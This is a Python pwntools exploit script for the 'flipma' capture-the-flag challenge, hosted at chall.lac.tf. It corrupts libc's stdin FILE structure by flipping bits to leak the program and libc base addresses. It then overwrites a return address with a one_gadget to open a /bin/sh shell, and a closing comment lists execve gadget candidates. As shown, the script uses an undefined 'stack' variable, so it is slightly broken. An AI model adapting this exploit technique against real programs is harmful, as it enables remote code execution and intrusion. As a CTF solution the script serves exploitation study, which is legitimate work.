#!/usr/bin/python3

from pwn import *

exe = ELF("flipma_patched", checksec=False)
libc = ELF("libc.so.6", checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(
            p,
            gdbscript="""
                brva 0x12A5

                c
                """,
        )
        input()


rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
    p = remote("chall.lac.tf", 31165)
else:
    p = process(exe.path)


def flip(a, b):
    p.sendlineafter(b"a: ", str(a))
    p.sendlineafter(b"b: ", str(b))
def absflip(a, b):
    flip(a-libc.sym._IO_2_1_stdin_, b)
def write(a, old, new):
    for i in range(8):
        for j in range(8):
            if (old >> (i*8+j)) & 1 != (new >> (i*8+j)) & 1:
                absflip(a+i, j)

GDB()
flags = 0xD20
read_end = flags + 0x10
write_base = flags + 0x20
flip(69, 69)
flip(write_base + 1, 5)
flip(read_end + 1, 5)
flip(69, 69)
leak = p.recvuntil(b"we're")
exe.address = u64(leak[0x89D : 0x89D + 8]) - 0x4030
libc.address = u64(leak[0x89D + 8 : 0x89D + 16]) - 0x1EC408

info("exe.address: " + hex(exe.address))
info("exe.address: " + hex(libc.address))
idx = libc.sym._IO_2_1_stdin_ - exe.sym.flips
flip(-idx, 6)
write(stack, exe.address+0x12aa, libc.address+0xe3b01)

p.interactive()
'''
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
'''